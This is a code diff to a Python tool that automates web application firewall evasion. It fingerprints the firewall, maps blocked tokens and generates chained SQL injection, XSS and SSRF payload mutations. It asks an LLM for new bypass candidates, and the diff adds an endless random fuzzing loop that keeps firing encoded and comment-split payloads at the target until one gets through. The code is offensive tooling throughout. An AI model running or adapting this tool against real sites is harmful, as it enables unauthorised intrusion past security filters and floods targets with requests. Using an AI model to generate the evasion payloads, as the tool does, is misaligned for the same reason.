@@ -1,3 +1,6 @@
+import random
+import re
+import urllib.parse
 import logging
 from typing import Dict, List, Any, Optional
 from pydantic import BaseModel
@@ -24,9 +27,9 @@ class BypassResult(BaseModel):
 
 class WafBypasser:
     """
-    Advanced orchestrator that runs auto-vuln detection, token probing,
-    WAF fingerprinting, multi-stage chained heuristic mutations,
-    and LLM feedback loop.
+    Advanced orchestrator that runs token probing, WAF fingerprinting,
+    chained mutations, LLM feedback loops, and falls back to an
+    infinite random mutation fuzzing engine.
     """
 
     def __init__(
@@ -38,7 +41,7 @@ class WafBypasser:
         headers: Optional[Dict[str, str]] = None,
         cookies: Optional[Dict[str, str]] = None,
         proxy: Optional[str] = None,
-        vuln_type: str = "auto",  # "auto", "sql", "ssrf", "xss", "generic"
+        vuln_type: str = "auto",
         use_llm: bool = False,
         llm_provider: str = "gemini",
         llm_api_key: Optional[str] = None,
@@ -51,7 +54,7 @@ class WafBypasser:
         self.use_llm = use_llm
         self.max_llm_iterations = max_llm_iterations
 
-        # 1. Auto-detect vulnerability type if needed
+        # Auto-detect vulnerability type
         self.vuln_type = self._detect_vuln_type(base_payload) if vuln_type == "auto" else vuln_type.lower()
 
         # Initialize WafClient
@@ -74,30 +77,19 @@ class WafBypasser:
         self.detected_waf = None
 
     def _detect_vuln_type(self, payload: str) -> str:
-        """Heuristically determines the vulnerability type based on payload contents."""
         payload_lower = payload.lower()
-        
-        # SSRF checks
         if any(scheme in payload_lower for scheme in ["http://", "https://", "ftp://", "gopher://", "dict://", "file://"]) or payload_lower in ["localhost", "127.0.0.1", "[::1]"]:
             return "ssrf"
-            
-        # XSS checks
         if any(tag in payload_lower for tag in ["<script", "javascript:", "onerror", "onload", "alert(", "confirm(", "prompt(", "<svg", "<iframe"]):
             return "xss"
-            
-        # SQL Injection checks
         if any(sql in payload_lower for sql in ["select", "union", "insert", "delete", "where", "--", "/*", "*/", "sys.user_tables"]):
             return "sql"
-            
         return "generic"
 
     def run(self) -> BypassResult:
-        """
-        Runs the advanced WAF bypass pipeline.
-        """
         logger.info(f"Starting advanced run. Detected vulnerability type: {self.vuln_type.upper()}")
         
-        # 1. Run WAF Fingerprinting on baseline block trigger
+        # 1. WAF Fingerprinting
         logger.info("Performing baseline WAF fingerprinting request...")
         fingerprint_res = self.client.send_payload(self.base_payload, param_name=self.param_name)
         self.detected_waf = WafFingerprinter.identify(
@@ -106,15 +98,13 @@ class WafBypasser:
             body=fingerprint_res["text"]
         )
         if self.detected_waf:
-            logger.info(f"Target Firewall Fingerprint: [bold red]{self.detected_waf}[/bold red]")
-        else:
-            logger.info("No distinct WAF signatures matched. Treating as standard security filter.")
+            logger.info(f"Target Firewall Fingerprint: {self.detected_waf}")
 
         # 2. Probe target and build BlockMap
         prober = WafProber(client=self.client, param_name=self.param_name)
         block_map = prober.probe_all()
 
-        # 3. Generate chained/nested candidates using pipeline
+        # 3. Generate chained candidates using heuristics
         candidates = self._generate_chained_candidates(self.base_payload, block_map)
         logger.info(f"Generated {len(candidates)} multi-stage nested bypass candidates.")
 
@@ -127,7 +117,6 @@ class WafBypasser:
             logger.debug(f"Testing candidate payload: {repr(candidate)}")
             res = self.client.send_payload(candidate, param_name=self.param_name)
             
-            # Log attempt
             attempt_log = {
                 "source": "heuristic_chained",
                 "payload": candidate,
@@ -149,10 +138,9 @@ class WafBypasser:
                     log=self.history
                 )
 
-        # 5. Fallback to LLM generative loop if rule-based pipeline fails
-        if self.use_llm and self.llm_client:
+        # 5. LLM Feedback Loop
+        if self.use_llm and self.llm_client and self.llm_client.api_key:
             logger.info("Heuristic mutation pipeline exhausted. Initiating LLM generative feedback loop...")
-            
             last_resp = self.history[-1] if self.history else {"status_code": 403, "length": 0, "text": "Access Denied"}
 
             iteration = 0
@@ -167,9 +155,8 @@ class WafBypasser:
                 iter_label = f"unlimited_{iteration+1}" if self.max_llm_iterations <= 0 else f"{iteration+1}/{self.max_llm_iterations}"
                 logger.info(f"LLM Loop iteration {iter_label}...")
 
-                # Feed LLM with target blocks, last failure, and history of tested payloads to avoid duplicates
                 context_summary = last_resp.copy()
-                context_summary["previously_tested_failed_payloads"] = list(self.tested_payloads)[-15:] # send last 15 attempts to keep token size low
+                context_summary["previously_tested_failed_payloads"] = list(self.tested_payloads)[-15:]
                 context_summary["detected_waf"] = self.detected_waf
 
                 llm_candidates = self.llm_client.generate_mutations(
@@ -215,6 +202,56 @@ class WafBypasser:
                     last_resp = attempt_log
                 iteration += 1
 
+        # 6. Fallback Random Fuzzing Loop (if LLM is disabled or fails to bypass)
+        # Only trigger this if max_llm_iterations <= 0 (unlimited mode is on)
+        if self.max_llm_iterations <= 0:
+            logger.warning("Starting fallback Random Evasion Fuzzing loop...")
+            iteration = 0
+            current_seed = self.base_payload
+            
+            while True:
+                # Every 100 attempts, print status update
+                if iteration > 0 and iteration % 100 == 0:
+                    logger.warning(f"Fuzzer has sent {iteration} random mutated payloads. Still fuzzing...")
+                
+                # Pick a random candidate from history as base, or keep current seed
+                if self.history and random.random() < 0.3:
+                    current_seed = random.choice(self.history)["payload"]
+                
+                # Mutate seed
+                mutated = self._apply_random_mutations(current_seed, block_map)
+                
+                if mutated in self.tested_payloads:
+                    # If duplicate, just mutate again
+                    continue
+                
+                self.tested_payloads.add(mutated)
+                logger.info(f"Testing random mutated payload #{iteration+1}: {repr(mutated)}")
+                res = self.client.send_payload(mutated, param_name=self.param_name)
+                
+                attempt_log = {
+                    "source": "random_fuzz",
+                    "payload": mutated,
+                    "is_blocked": res["is_blocked"],
+                    "status_code": res["status_code"],
+                    "length": res["length"],
+                }
+                self.history.append(attempt_log)
+                
+                if res["success"]:
+                    logger.info(f"Bypass SUCCESS with random fuzz payload: {repr(mutated)}")
+                    return BypassResult(
+                        success=True,
+                        payload=mutated,
+                        block_map=block_map.to_dict(),
+                        detected_waf=self.detected_waf,
+                        vuln_type=self.vuln_type,
+                        attempts=len(self.tested_payloads),
+                        log=self.history
+                    )
+                
+                iteration += 1
+
         # If everything fails
         logger.warning("Failed to bypass WAF. All candidates blocked.")
         return BypassResult(
@@ -228,11 +265,6 @@ class WafBypasser:
         )
 
     def _generate_chained_candidates(self, base_payload: str, block_map: BlockMap) -> List[str]:
-        """
-        Runs a multi-stage mutation pipeline chaining SQL/SSRF transformations
-        together with encoding mutators to create advanced nested bypass payloads.
-        """
-        # Set up specific mutator layers
         vuln_mutator = None
         if self.vuln_type == "sql":
             vuln_mutator = SqlMutator()
@@ -241,17 +273,89 @@ class WafBypasser:
 
         encoder = EncoderMutator()
 
-        # Step 1: Base candidates (vuln specific)
         level_1 = [base_payload]
         if vuln_mutator:
             level_1.extend(vuln_mutator.mutate(base_payload, block_map))
         level_1 = list(set(level_1))
 
-        # Step 2: Apply encoders to all level 1 candidates (combining casing/obfuscation + encodings)
         level_2 = []
         for l1_candidate in level_1:
             level_2.extend(encoder.mutate(l1_candidate, block_map))
         
-        # Combine all candidates together
-        final_candidates = list(set(level_1 + level_2))
-        return final_candidates
+        return list(set(level_1 + level_2))
+
+    def _apply_random_mutations(self, payload: str, block_map: BlockMap) -> str:
+        """
+        Applies a random combination of evasion primitives to mutate a payload.
+        """
+        mutations = [
+            self._mutate_random_case,
+            self._mutate_random_spaces,
+            self._mutate_random_comments,
+            self._mutate_random_encoding,
+        ]
+        
+        # Apply 1 to 3 random mutations
+        num_mutations = random.randint(1, 3)
+        mutated_payload = payload
+        
+        for _ in range(num_mutations):
+            mutator_func = random.choice(mutations)
+            mutated_payload = mutator_func(mutated_payload, block_map)
+            
+        return mutated_payload
+
+    def _mutate_random_case(self, payload: str, block_map: BlockMap) -> str:
+        # Swap case of characters randomly
+        return "".join(c.upper() if random.random() < 0.3 else c.lower() for c in payload)
+
+    def _mutate_random_spaces(self, payload: str, block_map: BlockMap) -> str:
+        # Replace spaces with random alternatives
+        space_alts = ["/**/", "+", "%0a", "%09", "%0d"]
+        allowed_alts = [a for a in space_alts if not any(block_map.is_blocked(char) for char in a)]
+        
+        if not allowed_alts:
+            return payload
+            
+        parts = payload.split(" ")
+        mutated_parts = []
+        for p in parts[:-1]:
+            mutated_parts.append(p)
+            mutated_parts.append(random.choice(allowed_alts))
+        mutated_parts.append(parts[-1])
+        
+        return "".join(mutated_parts)
+
+    def _mutate_random_comments(self, payload: str, block_map: BlockMap) -> str:
+        # Inject comment blocks inside SQL keywords
+        keywords = ["union", "select", "from", "where"]
+        mutated = payload
+        for kw in keywords:
+            if kw in mutated.lower() and len(kw) > 2:
+                # Find occurrences
+                matches = list(re.finditer(kw, mutated, re.IGNORECASE))
+                if matches:
+                    match = random.choice(matches)
+                    start, end = match.span()
+                    mid = start + (end - start) // 2
+                    
+                    # Random comment styles
+                    comment_styles = ["/**/", "/*!50000union*/" if kw == "union" else "/*!50000select*/"]
+                    comment = random.choice(comment_styles)
+                    
+                    mutated = mutated[:mid] + comment + mutated[mid:]
+        return mutated
+
+    def _mutate_random_encoding(self, payload: str, block_map: BlockMap) -> str:
+        # Encode random characters to URL/Unicode
+        result = ""
+        for char in payload:
+            if random.random() < 0.2:
+                # URL encode
+                result += urllib.parse.quote(char)
+            elif random.random() < 0.1:
+                # Unicode escape
+                result += f"\\u{ord(char):04x}"
+            else:
+                result += char
+        return result
